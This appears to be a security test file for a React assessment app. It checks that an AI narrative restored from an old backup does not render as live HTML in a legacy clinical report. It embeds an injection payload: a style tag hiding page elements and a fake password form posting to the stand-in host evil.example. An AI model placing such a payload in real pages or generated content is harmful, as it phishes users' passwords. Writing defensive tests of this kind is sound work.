// Critic 18 scratch: an AI narrative carried in a restored file reaches the legacy report as live HTML.
import React, { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { TRANSLATIONS } from '../../shared/i18n/strings';
import { applyBackup, prepareBackup } from '../core/backup';

const aiMocks = vi.hoisted(() => ({
  aiReport: vi.fn(() => new Promise<string>(() => undefined)),
  degradation: { degraded: false, reason: null as string | null },
  primary: 'cloud' as 'cloud' | 'heuristic',
}));
vi.mock('../core/ai.adapter', () => ({ AI: { aiReport: aiMocks.aiReport }, ResilientAiAdapter: aiMocks }));
import { LegacyClinicalReport } from './legacy-report.jsx';

globalThis.IS_REACT_ACT_ENVIRONMENT = true;
let root: Root | null = null;
let host: HTMLDivElement | null = null;

const PAYLOAD = [
  'Your pattern is clear and worth reading slowly, one part at a time, with patience and care for yourself.',
  '<style>.overlay,.phone{display:none}</style>',
  '<form action="https://evil.example/collect"><p>Confirm your password to keep this report</p><input name="password" type="password"></form>',
].join('\n\n');

function file() {
  const responses = Array.from({ length: 64 }, (_, index) => (index % 5) + 1);
  const pole = { agency: 0.1, emotional_temperature: -0.2, relational_focus: 0.3, attachment: 0.1 };
  const pantheon = Array.from({ length: 4 }, (_, index) => ({
    name: `Archetype ${index + 1}`, symbol: '✨', description: 'A description of this archetype.', wound: 'A wound.',
    shadow: 'A shadow.', invitation: 'An invitation.', coreBelief: 'A belief.', attracts: 'Attracts.',
    size: 0.8, coordinates: [0.1, -0.2, 0.3, 0.4], cluster: 'gift_archetypes', prominence: 25, partType: 'self', developmentalOrigin: 'adolescent',
  }));
  // The shape of an older Angular export: the 64 answers and the completed results with the AI analysis.
  return JSON.stringify({
    assessmentResponses: responses,
    results: { aiAnalysis: { analysis: PAYLOAD, poleScores: pole, pantheon } },
    version: 1,
    language: 'en',
  });
}

beforeEach(() => localStorage.clear());
afterEach(() => {
  if (root) act(() => root?.unmount());
  root = null;
  host?.remove();
  host = null;
  localStorage.clear();
});

describe('critic18-E: restored AI narrative in the legacy report', () => {
  it('E1 the restored legacy result keeps the AI narrative verbatim, HTML included', async () => {
    const prepared = await prepareBackup(file(), 'en');
    applyBackup(prepared, localStorage, 'merge');
    const result = JSON.parse(localStorage.getItem('ifs.legacy64.result')!);
    expect(result.aiNarrative).not.toContain('<form');
  });

  it('E2 the legacy report renders the restored narrative as live form and style elements', async () => {
    const prepared = await prepareBackup(file(), 'en');
    applyBackup(prepared, localStorage, 'merge');
    const result = JSON.parse(localStorage.getItem('ifs.legacy64.result')!);
    const responses = Array.from({ length: 64 }, (_, index) => (index % 5) + 1);
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => {
      root?.render(React.createElement(LegacyClinicalReport, {
        result, responses, resultCopy: TRANSLATIONS.en.assessment.results, lang: 'en', scoringMethod: 'fallback',
        onBack: vi.fn(), onRetake: vi.fn(), onNarrativeChange: vi.fn(),
      }));
    });
    const forms = Array.from(host.querySelectorAll('form')).map((f) => f.getAttribute('action'));
    const styles = Array.from(host.querySelectorAll('style')).map((s) => s.textContent);
    expect({ forms, styles }).toEqual({ forms: [], styles: [] });
  });
});
